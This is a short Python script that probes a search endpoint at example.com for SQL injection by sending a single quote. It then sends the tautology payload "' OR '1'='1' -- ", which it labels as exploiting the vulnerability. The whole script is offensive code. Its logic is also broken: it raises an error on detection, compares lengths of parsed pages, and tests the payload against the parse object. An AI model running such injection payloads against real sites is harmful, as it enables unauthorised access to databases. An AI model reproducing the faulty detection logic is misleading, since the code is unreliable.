import requests
from bs4 import BeautifulSoup

url = 'http://example.com/search'

# Send a request with an empty search query
response_empty_search = requests.get(url, params={'search': ''})
soup_empty_search = BeautifulSoup(response_empty_search.text, 'html.parser')

# Send a request with a single quote to detect potential vulnerability
response_quote = requests.get(url, params={'search': "'"})
soup_quote = BeautifulSoup(response_quote.text, 'html.parser')

# Compare the results to detect a potential vulnerability
if len(soup_empty_search) != len(soup_quote):
    raise ValueError("Potential SQL Injection vulnerability detected")

# Exploit the vulnerability if present
payload = "' OR '1'='1' -- "
response_exploit = requests.get(url, params={'search': payload})
soup_exploit = BeautifulSoup(response_exploit.text, 'html.parser')

# Check if the payload is found in the response
if payload not in soup_exploit:
    raise ValueError("Payload not found in response")
